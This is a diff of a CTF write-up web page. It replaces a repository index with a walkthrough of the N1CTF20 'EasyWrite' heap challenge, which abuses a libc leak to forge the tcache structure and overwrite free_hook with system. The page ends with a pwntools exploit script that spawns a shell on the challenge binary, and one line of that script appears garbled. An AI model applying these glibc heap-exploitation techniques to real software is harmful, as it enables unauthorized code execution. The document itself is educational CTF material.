@@ -6,12 +6,12 @@
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         
         
-        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/pwning/intro/">
-        <link rel="shortcut icon" href="../../img/favicon.ico">
-        <title>Binary Exploitation - CTF-Writeups</title>
-        <link href="../../css/bootstrap-custom.min.css" rel="stylesheet">
-        <link href="../../css/font-awesome.min.css" rel="stylesheet">
-        <link href="../../css/base.css" rel="stylesheet">
+        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/pwning/N1CTF20/easywrite/intro/">
+        <link rel="shortcut icon" href="../../../../img/favicon.ico">
+        <title>EasyWrite - CTF-Writeups</title>
+        <link href="../../../../css/bootstrap-custom.min.css" rel="stylesheet">
+        <link href="../../../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../../../css/base.css" rel="stylesheet">
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atelier-forest-light.min.css">
         <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
         <!--[if lt IE 9]>
@@ -19,8 +19,8 @@
             <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
         <![endif]-->
 
-        <script src="../../js/jquery-1.10.2.min.js" defer></script>
-        <script src="../../js/bootstrap-3.0.3.min.js" defer></script>
+        <script src="../../../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../../../js/bootstrap-3.0.3.min.js" defer></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
         <script>hljs.initHighlightingOnLoad();</script> 
     </head>
@@ -39,7 +39,7 @@
                         <span class="icon-bar"></span>
                         <span class="icon-bar"></span>
                     </button>
-                    <a class="navbar-brand" href="../..">CTF-Writeups</a>
+                    <a class="navbar-brand" href="../../../..">CTF-Writeups</a>
                 </div>
 
                 <!-- Expanded navigation -->
@@ -47,7 +47,7 @@
                         <!-- Main navigation -->
                         <ul class="nav navbar-nav">
                             <li >
-                                <a href="../../about/">About Us</a>
+                                <a href="../../../../about/">About Us</a>
                             </li>
                             <li >
                                 <a href="https://team-shakti.github.io/">Website</a>
@@ -61,7 +61,7 @@
                             </a>
                         </li>
                             <li>
-                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/pwning/intro.md">Edit on Team-Shakti/CTF-Write-ups</a>
+                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/pwning/N1CTF20/easywrite/intro.md">Edit on Team-Shakti/CTF-Write-ups</a>
                             </li>
                     </ul>
                 </div>
@@ -71,36 +71,55 @@
         <div class="container">
                 <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
     <ul class="nav bs-sidenav">
-        <li class="main active"><a href="#binary-exploitation">Binary Exploitation</a></li>
-            <li><a href="#introduction">Introduction</a></li>
-            <li><a href="#the-contents-of-this-repo">The contents of this repo</a></li>
+        <li class="main active"><a href="#easywrite">EasyWrite</a></li>
+            <li><a href="#initial-click">Initial Click</a></li>
+            <li><a href="#what-did-not-work">What did not work?</a></li>
+            <li><a href="#crux-controlling-tcache">Crux: Controlling Tcache</a></li>
+            <li><a href="#what-happened-next">What happened next?</a></li>
+            <li><a href="#exploit">Exploit</a></li>
     </ul>
 </div></div>
                 <div class="col-md-9" role="main">
 
-<h1 id="binary-exploitation">Binary Exploitation</h1>
-<h2 id="introduction">Introduction</h2>
-<p>"Write about Pwn and about the writeups"</p>
-<h2 id="the-contents-of-this-repo">The contents of this repo</h2>
-<p>This repo contains the writeups of varoius challenges from CTFs we have attempted.</p>
-<ul>
-<li><a href="https://ctftime.org/event/1033">De1CTF20</a><ul>
-<li><a href="../De1CTF20/stl/">STL_Container</a> - <a href="https://twitter.com/rudyerudite">Shruti Dixit</a></li>
-</ul>
-</li>
-<li><a href="https://ctftime.org/event/939">HSCTF20</a><ul>
-<li><a href="../HSCTF20/studysim/">StudySim</a> - <a href="https://twitter.com/rudyerudite">Shruti Dixit</a></li>
-</ul>
-</li>
-<li><a href="https://ctftime.org/event/933">VolgaCTF20</a><ul>
-<li><a href="../VolgaCTF20/notepad/">Notepad--</a> - <a href="https://twitter.com/rudyerudite">Shruti Dixit</a></li>
-</ul>
-</li>
-<li><a href="https://ctftime.org/event/1099">N1CTF20</a><ul>
-<li><a href="../N1CTF20/easywrite/">EasyWrite</a> - <a href="https://twitter.com/rudyerudite">Shruti Dixit</a></li>
-</ul>
-</li>
-</ul></div>
+<h1 id="easywrite">EasyWrite</h1>
+<p>The past weekend I played N1CTF along with my teammates, I ended up spending most of the time in EasyWrite and Signin. In this writeup I’ll be explaining about my approach for the EasyWrite, so let’s get started!</p>
+<h2 id="initial-click">Initial Click</h2>
+<p>All the useful mitigation are enabled other than FORTIFY. Also, the libc version required is libc-2.31. In a nutshell, the binary does the follows:</p>
+<ol>
+<li>Gives us the libc leak directly</li>
+<li>We can input 0x299 bytes which is stored on the heap [chunk1]</li>
+<li>Asks us to enter an address [addr1] where contents of chunk1 are copied to</li>
+<li>Allocated a chunk of size 0x30 [chunk2]. We can write 0x2f bytes to this chunk.</li>
+<li>chunk2 is freed.</li>
+</ol>
+<p>From this I could deduce that overwriting free_hook could be the key. But it wasn’t really that easy.</p>
+<h2 id="what-did-not-work">What did not work?</h2>
+<p>On the first try, I gave addr1 as free_hook_ and the contents of chunk1 as address of system/ shellcode what not. I ended up with a SIGSEV because this was bound not to work as the binary was executing the chunk1 address and NX was enabled. I couldn’t find any other targets for a long while.</p>
+<p>Another thing to try out was the controlling tcache structure because we could utilize the write happening on chunk2. Basically, we had to control malloc to help us in getting an arbitrary write. How about getting an allocation on free_hook_ and then overwriting it to get a shell? Not that easy.</p>
+<h2 id="crux-controlling-tcache">Crux: Controlling Tcache</h2>
+<p>We know that it’s the tcache_perthread_struct (stored on the heap) which kind of keeps a track of the count of chunks are present in the bin and also which one to be recycled on the next call. But in the present scenario we cannot control it because we do not have any way to get heap leaks but we have the libc leaks. Is there any way to control this region if we are armed only with libc leaks?</p>
+<p>I found a mmap’d address which stores the pointer to the [tcache_perthread structure] -0x10 address. If we could overwrite this address with a chunk1 which has our fake tcache_structure (where the next 0x30 size chunk to be recycled is our free_hook_) then we could get the desired arbitrary write. In my understanding this mmap region is the global Tcache pointer which stores the pointer to the tcache structure (one stored on heap). More details can be found on another writeup on the same which gives a detailed understanding: https://ctftime.org/writeup/24295 .</p>
+<h2 id="what-happened-next">What happened next?</h2>
+<p>Unfortunately, I was not able to complete the challenge during the CTF. Here, none of the one_gadgets come to handy so one must overwrite free_hook_ with system but then it would call free(system) =&gt; system(system) which is really not what we desire. My teammate and I did a lot of tries on this but found it out very late that one could get the arbitrary write at free_hook -0x8 and overwrite it with “/bin/sh\x00” + libc_system_address.</p>
+<p>Nevertheless, this was a fun challenge as I really learned something new. Also, we must learn to read the source code when all the doors seem to be closed. </p>
+<h2 id="exploit">Exploit</h2>
+<pre><code class="python">
+from pwn import *
+p = process(&quot;./easy&quot;,env = {&quot;LD_PRELOAD&quot; : &quot;./libc-2.31.so&quot;})
+p.recvuntil(&quot;Here is your gift:&quot;)
+leak = int(p.recvline().strip(),16)
+print(hex(leak))
+libc_start = leak - 0x08ec50
+log.info(&quot;libc_start = &quot; + hex(libc_start))
+system = libc_start + 0x055410
+free_hook = libc_start + 0x00000000001eeb28
+tls_tcache = libc_start + 0x1f34f0
+fake_tcache = p64(0x0000000100000000) + p64(0)0x82+p64(0)+ p64(free_hook-0x8)
+p.sendafter(&quot;Input your message:&quot;,fake_tcache)
+p.sendafter(&quot;Where to write?:&quot;,p64(tls_tcache))
+p.sendafter(&quot;Any last message?:&quot;,&quot;/bin/sh\x00&quot;+p64(system))
+p.interactive()
+</code></pre></div>
         </div>
 
         <footer class="col-md-12">
@@ -109,12 +128,12 @@
             <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
         </footer>
         <script>
-            var base_url = "../..",
+            var base_url = "../../../..",
                 shortcuts = {"search": 83, "next": 78, "help": 191, "previous": 80};
         </script>
-        <script src="../../js/base.js" defer></script>
+        <script src="../../../../js/base.js" defer></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
-        <script src="../../search/main.js" defer></script>
+        <script src="../../../../search/main.js" defer></script>
 
         <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="Search Modal" aria-hidden="true">
     <div class="modal-dialog">
